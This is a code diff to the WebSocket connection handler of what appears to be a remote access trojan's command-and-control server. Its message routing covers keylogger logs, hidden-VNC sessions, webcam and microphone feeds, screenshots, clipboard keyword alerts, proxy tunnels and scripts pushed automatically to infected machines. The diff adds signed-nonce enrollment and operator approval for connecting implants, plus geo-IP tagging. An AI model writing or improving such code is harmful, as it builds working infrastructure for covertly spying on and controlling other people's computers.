@@ -1,8 +1,10 @@
 import type { ServerWebSocket } from "bun";
 import { v4 as uuidv4 } from "uuid";
+import geoip from "geoip-lite";
 import { logAudit, AuditAction } from "../../auditLog";
 import * as clientManager from "../../clientManager";
-import { clientExists, setOnlineState, upsertClientRow } from "../../db";
+import { clientExists, setOnlineState, upsertClientRow, getClientEnrollmentStatus, setClientEnrollmentStatus, lookupClientByPublicKey } from "../../db";
+import { getConfig } from "../../config";
 import { logger } from "../../logger";
 import { metrics } from "../../metrics";
 import { decodeMessage, encodeMessage, type WireMessage } from "../../protocol";
@@ -85,6 +87,42 @@ type WsLifecycleDeps = {
   notifyDashboard: () => void;
 };
 
+const ENROLLMENT_TIMEOUT_MS = 30_000;
+const enrollmentTimeouts = new Map<string, ReturnType<typeof setTimeout>>();
+
+function clearEnrollmentTimeout(clientId: string) {
+  const t = enrollmentTimeouts.get(clientId);
+  if (t) {
+    clearTimeout(t);
+    enrollmentTimeouts.delete(clientId);
+  }
+}
+
+async function verifyEd25519(publicKeyBase64: string, signatureBase64: string, nonceBase64: string): Promise<boolean> {
+  try {
+    const pubKeyBytes = Buffer.from(publicKeyBase64, "base64");
+    const sigBytes = Buffer.from(signatureBase64, "base64");
+    const nonceBytes = Buffer.from(nonceBase64, "base64");
+    if (pubKeyBytes.length !== 32 || sigBytes.length !== 64) return false;
+    const key = await crypto.subtle.importKey(
+      "raw",
+      pubKeyBytes,
+      { name: "Ed25519" },
+      false,
+      ["verify"],
+    );
+    return await crypto.subtle.verify("Ed25519", key, sigBytes, nonceBytes);
+  } catch {
+    return false;
+  }
+}
+
+function computeKeyFingerprint(publicKeyBase64: string): string {
+  const bytes = Buffer.from(publicKeyBase64, "base64");
+  const hash = new Bun.CryptoHasher("sha256").update(bytes).digest("hex");
+  return hash;
+}
+
 export function handleWebSocketOpen(ws: ServerWebSocket<SocketData>, deps: WsLifecycleDeps): void {
   const role = ws.data.role as string;
   const clientId = ws.data.clientId;
@@ -101,43 +139,32 @@ export function handleWebSocketOpen(ws: ServerWebSocket<SocketData>, deps: WsLif
   if (role === "notifications_viewer") return deps.handleNotificationViewerOpen(ws);
 
   const id = clientId || uuidv4();
-  const info: ClientInfo = { id, role: role as any, ws, lastSeen: Date.now(), country: "", ip, online: true };
-  clientManager.addClient(id, info);
-
   ws.data.clientId = id;
   ws.data.ip = ip;
-  if (role === "client") {
-    ws.data.wasKnown = clientExists(id);
-  }
 
-  upsertClientRow({ id, role: role as any, ip, lastSeen: info.lastSeen, online: 1 as any });
-  logger.info(`[open] ${id} role=${role}`);
+  const nonceBytes = new Uint8Array(32);
+  crypto.getRandomValues(nonceBytes);
+  const nonceBase64 = Buffer.from(nonceBytes).toString("base64");
+  ws.data.enrollmentNonce = nonceBase64;
 
-  const notificationConfig = deps.getNotificationConfig();
-  ws.send(
-    encodeMessage({
-      type: "hello_ack",
-      id,
-      notification: {
-        keywords: notificationConfig.keywords || [],
-        minIntervalMs: notificationConfig.minIntervalMs || 8000,
-        clipboardEnabled: notificationConfig.clipboardEnabled || false,
-      },
-    }),
-  );
+  ws.send(encodeMessage({ type: "enrollment_challenge", nonce: nonceBase64 }));
 
-  if (role === "client") {
-    deps.notifyRemoteDesktopStatus(id, "online");
-    metrics.recordConnection();
-    deps.notifyDashboard();
-  }
+  const timeout = setTimeout(() => {
+    enrollmentTimeouts.delete(id);
+    try {
+      ws.close(4002, "enrollment_timeout");
+    } catch {}
+  }, ENROLLMENT_TIMEOUT_MS);
+  enrollmentTimeouts.set(id, timeout);
+
+  logger.info(`[open] ${id} role=${role} — purgatory challenge sent`);
 }
 
-export function handleWebSocketMessage(
+export async function handleWebSocketMessage(
   ws: ServerWebSocket<SocketData>,
   message: string | ArrayBuffer | Uint8Array,
   deps: WsLifecycleDeps,
-): void {
+): Promise<void> {
   const size = getMessageByteLength(message as any);
   const role = ws.data?.role as any;
   const limit = getMaxPayloadLimit(role, deps.maxClientPayloadBytes, deps.maxViewerPayloadBytes);
@@ -162,57 +189,194 @@ export function handleWebSocketMessage(
   if (socketRole === "dashboard_viewer") return;
 
   const { clientId, ip } = ws.data;
-  const info = clientManager.getClient(clientId);
-  if (!info) return;
-  info.lastSeen = Date.now();
 
+  let payload: WireMessage;
   try {
-    const payload = decodeMessage(message as Uint8Array) as WireMessage;
+    payload = decodeMessage(message as Uint8Array) as WireMessage;
     if (!payload || typeof (payload as any).type !== "string") {
       return;
     }
-    if (!isAllowedClientMessageType((payload as any).type)) {
-      logger.warn(`[message] Dropping unknown client message type: ${(payload as any).type}`);
-      return;
-    }
+  } catch (err) {
+    logger.error("[message] decode error", err);
+    return;
+  }
 
-    const payloadType = (payload as any)?.type as string;
+  const payloadType = (payload as any).type as string;
+
+  if (!isAllowedClientMessageType(payloadType)) {
+    logger.warn(`[message] Dropping unknown client message type: ${payloadType}`);
+    return;
+  }
+
+  const info = clientManager.getClient(clientId);
+
+  if (!info && payloadType !== "hello") return;
+  if (info) info.lastSeen = Date.now();
+
+  const client = info!;
+
+  try {
     switch (payloadType) {
       case "hello": {
-        handleHello(info, payload, ws, ip);
-        clientManager.addClient(info.id, info);
-        deps.dispatchAutoScriptsForConnection(info, ws);
+        clearEnrollmentTimeout(clientId);
+
+        const publicKey = typeof (payload as any).publicKey === "string" ? (payload as any).publicKey : "";
+        const signature = typeof (payload as any).signature === "string" ? (payload as any).signature : "";
+        const nonce = ws.data.enrollmentNonce || "";
+
+        if (!publicKey || !signature || !nonce) {
+          logger.warn(`[purgatory] missing publicKey/signature/nonce for ${clientId}`);
+          try { ws.close(4002, "invalid_signature"); } catch {}
+          return;
+        }
+
+        const valid = await verifyEd25519(publicKey, signature, nonce);
+        if (!valid) {
+          logger.warn(`[purgatory] invalid signature for ${clientId}`);
+          try { ws.close(4002, "invalid_signature"); } catch {}
+          return;
+        }
+
+        ws.data.enrollmentNonce = undefined;
+
+        const keyFingerprint = computeKeyFingerprint(publicKey);
+        const config = getConfig();
+        const requireApproval = config.enrollment?.requireApproval ?? true;
+
+        const existing = lookupClientByPublicKey(publicKey);
+        let enrollmentStatus: string;
+
+        if (existing) {
+          enrollmentStatus = existing.enrollmentStatus;
+          ws.data.clientId = existing.id;
+        } else {
+          enrollmentStatus = requireApproval ? "pending" : "approved";
+        }
+
+        const resolvedId = ws.data.clientId;
+
+        if (enrollmentStatus === "denied") {
+          logger.info(`[purgatory] denied client ${resolvedId} tried to connect`);
+          ws.send(encodeMessage({ type: "enrollment_status", status: "denied" }));
+          try { ws.close(4003, "denied"); } catch {}
+          return;
+        }
+
+        if (enrollmentStatus === "pending") {
+          const geo = ip ? geoip.lookup(ip) : undefined;
+          const countryRaw = geo?.country || (payload as any).country || "ZZ";
+          const country = /^[A-Z]{2}$/i.test(countryRaw) ? countryRaw.toUpperCase() : "ZZ";
+
+          upsertClientRow({
+            id: resolvedId,
+            hwid: (payload as any).hwid || resolvedId,
+            role: "client",
+            ip: ip || undefined,
+            host: (payload as any).host || undefined,
+            os: (payload as any).os || undefined,
+            arch: (payload as any).arch || undefined,
+            version: (payload as any).version || undefined,
+            user: (payload as any).user || undefined,
+            monitors: (payload as any).monitors || undefined,
+            country,
+            lastSeen: Date.now(),
+            online: 0 as any,
+            publicKey,
+            keyFingerprint,
+            enrollmentStatus: "pending",
+          });
+
+          logger.info(`[purgatory] client ${resolvedId} is pending approval`);
+          ws.send(encodeMessage({ type: "enrollment_status", status: "pending" }));
+          deps.notifyDashboard();
+          try { ws.close(4001, "pending"); } catch {}
+          return;
+        }
+
+        const existingClient = clientManager.getClient(resolvedId);
+        if (existingClient?.ws && existingClient.ws !== ws) {
+          logger.info(`[purgatory] kicking existing socket for ${resolvedId} (superseded)`);
+          try { existingClient.ws.close(4004, "superseded"); } catch {}
+          clientManager.deleteClient(resolvedId);
+        }
+
+        ws.data.wasKnown = clientExists(resolvedId);
+
+        const infoObj: ClientInfo = {
+          id: resolvedId,
+          role: "client",
+          ws,
+          lastSeen: Date.now(),
+          country: "",
+          ip,
+          online: true,
+          publicKey,
+          keyFingerprint,
+          enrollmentStatus: "approved" as any,
+        };
+        clientManager.addClient(resolvedId, infoObj);
+
+        upsertClientRow({
+          id: resolvedId,
+          publicKey,
+          keyFingerprint,
+          enrollmentStatus: "approved",
+          online: 1 as any,
+          lastSeen: Date.now(),
+        });
+
+        const notificationConfig = deps.getNotificationConfig();
+        ws.send(
+          encodeMessage({
+            type: "hello_ack",
+            id: resolvedId,
+            notification: {
+              keywords: notificationConfig.keywords || [],
+              minIntervalMs: notificationConfig.minIntervalMs || 8000,
+              clipboardEnabled: notificationConfig.clipboardEnabled || false,
+            },
+          }),
+        );
+
+        handleHello(infoObj, payload, ws, ip);
+        clientManager.addClient(infoObj.id, infoObj);
+
+        deps.dispatchAutoScriptsForConnection(infoObj, ws);
         deps.notifyDashboard();
-        if (info.role === "client") {
-          const wasKnown = Boolean((ws as any)?.data?.wasKnown);
+
+        if (infoObj.role === "client") {
+          deps.notifyRemoteDesktopStatus(resolvedId, "online");
+          metrics.recordConnection();
+
+          const wasKnown = Boolean(ws.data.wasKnown);
           logAudit({
             timestamp: Date.now(),
             username: "system",
-            ip: (ws as any)?.data?.ip || ip || "unknown",
+            ip: ws.data?.ip || ip || "unknown",
             action: wasKnown ? AuditAction.CLIENT_RECONNECT : AuditAction.CLIENT_FIRST_CONNECT,
-            targetClientId: info.id,
+            targetClientId: infoObj.id,
             success: true,
-            details: JSON.stringify({ host: info.host, os: info.os, user: info.user }),
+            details: JSON.stringify({ host: infoObj.host, os: infoObj.os, user: infoObj.user }),
           });
           (ws as any).data.wasKnown = true;
 
           const buildTag = typeof (payload as any).buildTag === "string" ? (payload as any).buildTag : "";
           if (buildTag) {
-            deps.handleBuildTagConnection(info.id, buildTag);
+            deps.handleBuildTagConnection(infoObj.id, buildTag);
           }
         }
         break;
       }
       case "ping":
-        handlePing(info, payload, ws);
+        handlePing(client, payload, ws);
         break;
       case "pong":
-        handlePong(info, payload);
+        handlePong(client, payload);
         deps.notifyDashboard();
         break;
       case "frame":
         if ((payload as any)?.header?.fps === 0) {
-          const pending = deps.takePendingNotificationScreenshot(info.id);
+          const pending = deps.takePendingNotificationScreenshot(client.id);
           if (pending) {
             let bytes: Uint8Array | null = null;
             if ((payload as any).data instanceof Uint8Array) {
@@ -231,10 +395,10 @@ export function handleWebSocketMessage(
             }
           }
         }
-        handleFrame(info, payload);
+        handleFrame(client, payload);
         break;
       case "screenshot_result":
-        deps.handleNotificationScreenshotResult(info.id, payload);
+        deps.handleNotificationScreenshotResult(client.id, payload);
         break;
       case "console_output":
         deps.handleConsoleOutput(payload);
@@ -264,30 +428,30 @@ export function handleWebSocketMessage(
           (payload as any).ok,
           (payload as any).message,
         );
-        deps.handleFileBrowserMessage(info.id, payload);
+        deps.handleFileBrowserMessage(client.id, payload);
         if (payloadType === "command_result" && typeof (payload as any).commandId === "string") {
           deps.handleProxyConnectResult(
-            info.id,
+            client.id,
             (payload as any).commandId,
             Boolean((payload as any).ok),
           );
         }
         break;
       case "command_progress":
-        deps.handleFileBrowserMessage(info.id, payload);
+        deps.handleFileBrowserMessage(client.id, payload);
         break;
       case "process_list_result":
-        deps.handleProcessMessage(info.id, payload);
+        deps.handleProcessMessage(client.id, payload);
         break;
       case "keylog_file_list":
       case "keylog_file_content":
       case "keylog_clear_result":
       case "keylog_delete_result":
-        deps.handleKeyloggerMessage(info.id, payload);
+        deps.handleKeyloggerMessage(client.id, payload);
         break;
       case "script_result": {
         logger.debug(
-          `[script] client=${info.id} ok=${(payload as any).ok} output_length=${(payload as any).output?.length || 0}`,
+          `[script] client=${client.id} ok=${(payload as any).ok} output_length=${(payload as any).output?.length || 0}`,
         );
         const cmdId = (payload as any).commandId;
         if (cmdId && deps.pendingScripts.has(cmdId)) {
@@ -303,33 +467,33 @@ export function handleWebSocketMessage(
         break;
       }
       case "plugin_event":
-        deps.handlePluginEvent(info.id, payload);
+        deps.handlePluginEvent(client.id, payload);
         break;
       case "notification":
-        deps.handleNotification(info.id, payload);
+        deps.handleNotification(client.id, payload);
         break;
       case "voice_uplink":
-        deps.handleVoiceUplink(info.id, payload);
+        deps.handleVoiceUplink(client.id, payload);
         break;
       case "webcam_devices":
-        deps.handleWebcamDevices(info.id, payload);
+        deps.handleWebcamDevices(client.id, payload);
         break;
       case "hvnc_clone_progress":
-        deps.handleHVNCCloneProgress(info.id, payload);
+        deps.handleHVNCCloneProgress(client.id, payload);
         break;
       case "proxy_data": {
         const connId = (payload as any).connectionId;
         const tunnelData = (payload as any).data;
         if (typeof connId === "string" && tunnelData) {
           const bytes = tunnelData instanceof Uint8Array ? tunnelData : new Uint8Array(tunnelData);
-          deps.handleProxyTunnelData(info.id, connId, bytes);
+          deps.handleProxyTunnelData(client.id, connId, bytes);
         }
         break;
       }
       case "proxy_close": {
         const connId = (payload as any).connectionId;
         if (typeof connId === "string") {
-          deps.handleProxyTunnelClose(info.id, connId);
+          deps.handleProxyTunnelClose(client.id, connId);
         }
         break;
       }
@@ -350,6 +514,8 @@ export function handleWebSocketClose(
   const clientId = ws.data.clientId;
   const role = ws.data.role as string;
   const sessionId = ws.data.sessionId;
+
+  clearEnrollmentTimeout(clientId);
 
   if (role === "console_viewer") {
     if (sessionId) {
@@ -457,6 +623,12 @@ export function handleWebSocketClose(
 
   if (role === "dashboard_viewer") {
     sessionManager.deleteDashboardSession(ws.data.sessionId || clientId);
+    return;
+  }
+
+  const currentClient = clientManager.getClient(clientId);
+  if (currentClient && currentClient.ws !== ws) {
+    logger.info(`[close] ${clientId} code=${code} (superseded socket, skipping cleanup)`);
     return;
   }
 
